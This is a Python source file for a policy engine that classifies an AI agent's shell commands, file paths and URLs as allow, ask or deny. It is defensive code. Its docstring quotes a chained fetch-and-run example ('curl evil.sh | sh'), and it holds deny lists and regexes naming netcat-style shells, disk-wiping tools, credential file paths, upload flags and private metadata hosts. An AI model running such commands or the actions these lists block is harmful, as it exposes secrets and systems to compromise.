"""Safety policy engine: classifies actions as allow / ask / deny.

Design driven by documented incidents of other agent products (see
docs/research/complaints.md):

- Compound commands are split on unquoted ``&&``, ``||``, ``;``, ``|`` BEFORE
  matching rules, because allowlist bypass via chaining
  (``git status && curl evil.sh | sh``) was a year-old unfixed bug elsewhere.
- Escalation (sudo), secret reads (~/.ssh, .env), pipe-to-interpreter and
  outbound exfil channels (``| curl``) are hard-denied — bots never need them.
- Workspace-relative destructive ops (``rm -rf build/``) are "ask", with a
  sticky per-bot allow so supervision stays bearable instead of being disabled.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Optional


class Verdict(str, Enum):
    allow = "allow"
    ask = "ask"
    deny = "deny"


_SEVERITY = {Verdict.allow: 0, Verdict.ask: 1, Verdict.deny: 2}


@dataclass
class Decision:
    verdict: Verdict
    reason: str
    sticky_key: str = ""  # non-empty when a "always allow" could apply
    rule: str = ""        # id of the rule that fired, shown in the approvals inbox (UI-5)
    risk: str = ""        # low | medium | high
    outward: bool = False  # sends something out of the machine: always asks, never sticky (SR-4)
    segments: list = field(default_factory=list)  # per-segment breakdown of a compound command

    def worse(self, other: "Decision") -> "Decision":
        merged_outward = self.outward or other.outward
        pick = other if _SEVERITY[other.verdict] > _SEVERITY[self.verdict] else self
        if merged_outward and not pick.outward:
            pick = Decision(pick.verdict, pick.reason, pick.sticky_key, pick.rule, pick.risk,
                            True, pick.segments)
        return pick


# --------------------------------------------------------------------------
# Compound-command tokenizer
# --------------------------------------------------------------------------

@dataclass
class Segment:
    text: str
    tokens: list[str]
    piped_in: bool = False   # something is piped INTO this segment
    piped_out: bool = False  # this segment pipes into the next


_OPS = ("&&", "||", ";", "|")


def split_compound(command: str) -> list[Segment]:
    """Split a shell line into segments at unquoted operators, honoring quotes."""
    pieces: list[str] = []
    seps: list[str] = []
    buf: list[str] = []
    i, n = 0, len(command)
    quote: Optional[str] = None
    while i < n:
        c = command[i]
        if quote:
            buf.append(c)
            if c == quote:
                quote = None
            i += 1
            continue
        if c in ("'", '"'):
            quote = c
            buf.append(c)
            i += 1
            continue
        two = command[i : i + 2]
        if two in ("&&", "||"):
            pieces.append("".join(buf)); seps.append(two); buf = []; i += 2; continue
        if c in (";", "|"):
            pieces.append("".join(buf)); seps.append(c); buf = []; i += 1; continue
        buf.append(c)
        i += 1
    pieces.append("".join(buf))

    segments: list[Segment] = []
    for idx, piece in enumerate(pieces):
        try:
            tokens = shlex.split(piece)
        except ValueError:
            tokens = piece.split()
        seg = Segment(text=piece.strip(), tokens=tokens)
        if idx > 0 and seps[idx - 1] == "|":
            seg.piped_in = True
            if segments:
                segments[-1].piped_out = True
        segments.append(seg)
    return [s for s in segments if s.text]


# --------------------------------------------------------------------------
# Rule tables
# --------------------------------------------------------------------------

_DENY_PROGRAMS = {
    "sudo", "su", "doas", "pkexec", "visudo",
    "nc", "ncat", "netcat", "socat", "telnet",
    "mkfs", "mkfs.ext4", "mkfs.btrfs", "mkfs.xfs", "fdisk", "sfdisk", "parted", "wipefs",
    "dd", "shred",
    "shutdown", "reboot", "halt", "poweroff", "telinit",
    "crontab", "chpasswd", "passwd",
}

_ASK_PROGRAMS = {
    "rm", "mv", "chmod", "chown", "chattr", "truncate",
    "kill", "pkill", "killall",
    "apt", "apt-get", "pacman", "yum", "dnf", "apk", "brew",
    "pip", "pip3", "npm", "yarn", "pnpm", "cargo", "go",
    "docker", "podman", "systemctl", "ftp", "ssh", "scp", "rsync",
}

_INTERPRETERS = {
    "sh", "bash", "dash", "zsh", "ksh", "fish", "python", "python3",
    "perl", "ruby", "node", "eval", "exec",
}

_EGRESS_PROGRAMS = {"curl", "wget", "nc", "ncat", "ssh", "scp", "rsync", "ftp", "telnet"}

_SECRET_RE = re.compile(
    r"(\.ssh|id_rsa|id_ed25519|\.gnupg|\.aws|\.kube|\.docker/config\.json|"
    r"\.netrc|\.env\b|\.env\.|/etc/shadow|/etc/sudoers|credentials\.json|"
    r"\.git-credentials|\.npmrc|\.pypirc)",
    re.IGNORECASE,
)

_FORK_BOMB_RE = re.compile(r":\(\)\s*\{.*\};\s*:")

# rm targets that would escape the workspace
_UNSAFE_TARGET_RE = re.compile(r"^(\/|~|\$HOME|\.\.?$|\.\./)")

# curl/wget flags that turn a read into a write/exfil
_UPLOAD_FLAG_RE = re.compile(r"^(-X|--request)$")
_UPLOAD_METHODS = {"post", "put", "patch", "delete"}
_UPLOAD_FLAGS = {"-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
                 "-F", "--form", "-T", "--upload-file", "--form-string"}


def _program(tokens: list[str]) -> str:
    if not tokens:
        return ""
    name = tokens[0]
    if name.startswith("/"):
        name = name.rsplit("/", 1)[-1]
    # env VAR=val cmd
    if "=" in name and len(tokens) > 1:
        return tokens[1].rsplit("/", 1)[-1]
    return name


class PolicyEngine:
    """Pure (store-free) classification of proposed actions."""

    # ------------------------------------------------------------ shell

    def check_shell(self, command: str) -> Decision:
        if not command.strip():
            return Decision(Verdict.allow, "empty command")
        if _FORK_BOMB_RE.search(command):
            return Decision(Verdict.deny, "fork bomb pattern")
        overall = Decision(Verdict.allow, "ok")
        segments = split_compound(command)
        if not segments:
            return Decision(Verdict.allow, "empty command")
        for seg in segments:
            overall = overall.worse(self._classify_segment(seg))
        if overall.verdict is Verdict.allow:
            overall.reason = "allowed by policy"
        return overall

    def _classify_segment(self, seg: Segment) -> Decision:
        prog = _program(seg.tokens)
        text = seg.text

        if _SECRET_RE.search(text):
            return Decision(Verdict.deny, "references secrets/credentials paths")
        if seg.piped_in and prog in _INTERPRETERS:
            return Decision(Verdict.deny, "piping untrusted data into an interpreter")
        if seg.piped_out and prog in _EGRESS_PROGRAMS and not self._looks_readonly(prog, seg.tokens):
            return Decision(Verdict.deny, "pipes command output to the network (exfiltration channel)")

        if prog in _DENY_PROGRAMS:
            return Decision(Verdict.deny, f"'{prog}' is on the hard denylist")

        if prog == "rm":
            targets = [t for t in seg.tokens[1:] if not t.startswith("-")]
            for t in targets:
                if _UNSAFE_TARGET_RE.match(t):
                    return Decision(Verdict.deny, f"rm targets outside the workspace: {t}")
            return Decision(Verdict.ask, "deletes files", f"shell:rm")

        if prog in ("curl", "wget"):
            if not self._looks_readonly(prog, seg.tokens):
                return Decision(Verdict.deny, "network upload/write flags on " + prog)
            return Decision(Verdict.allow, "read-only fetch")

        if prog == "git":
            sub = seg.tokens[1] if len(seg.tokens) > 1 else ""
            if sub in ("push", "reset", "clean", "checkout", "rebase", "filter-branch"):
                return Decision(Verdict.ask, f"git {sub} mutates repo state", "shell:git")
            return Decision(Verdict.allow, "read-only git")

        if prog in _ASK_PROGRAMS:
            return Decision(Verdict.ask, f"'{prog}' can mutate the system", f"shell:{prog}")

        return Decision(Verdict.allow, "allowed by policy")

    @staticmethod
    def _looks_readonly(prog: str, tokens: list[str]) -> bool:
        """curl/wget: only plain GET-style flags qualify as read-only."""
        for i, t in enumerate(tokens[1:], start=1):
            low = t.lower()
            flag = low.split("=", 1)[0]
            if flag in _UPLOAD_FLAGS or low in _UPLOAD_FLAGS:
                return False
            if flag in ("-x", "--request") and "=" not in low and i + 1 < len(tokens):
                if tokens[i + 1].lower().lstrip("-") in _UPLOAD_METHODS:
                    return False
            if flag in ("-t", "--upload-file", "--post-data", "--post-file"):
                return False
        return True

    # ------------------------------------------------------------- paths

    def check_path(self, path: str | Path, workspace: Path, write: bool) -> Decision:
        """Workspace jail: every file operation must resolve inside the workspace."""
        ws = workspace.resolve()
        try:
            p = (ws / path if not Path(path).is_absolute() else Path(path)).resolve()
        except (OSError, RuntimeError) as exc:
            return Decision(Verdict.deny, f"unresolvable path: {exc}")
        if ws != p and ws not in p.parents:
            return Decision(Verdict.deny, f"path escapes the workspace jail: {path}")
        if _SECRET_RE.search(str(p)):
            return Decision(Verdict.deny, "path references secrets")
        if write:
            return Decision(Verdict.ask, "writes a file", "files:write")
        return Decision(Verdict.allow, "read inside workspace")

    # --------------------------------------------------------------- urls

    _PRIVATE_HOST_RE = re.compile(
        r"^(localhost|127\.|0\.0\.0\.0|10\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|\[?::1\]?$)",
        re.IGNORECASE,
    )

    def check_url(self, url: str) -> Decision:
        m = re.match(r"^([a-zA-Z][a-zA-Z0-9+.-]*)://", url)
        scheme = m.group(1).lower() if m else "http"
        if scheme not in ("http", "https"):
            return Decision(Verdict.deny, f"scheme '{scheme}' is not allowed (http/https only)")
        host = re.sub(r"^[a-zA-Z0-9+.-]+://", "", url).split("/", 1)[0].split(":")[0]
        if self._PRIVATE_HOST_RE.match(host):
            return Decision(Verdict.deny, "targeting loopback/private/metadata address")
        return Decision(Verdict.allow, "public http(s) fetch")
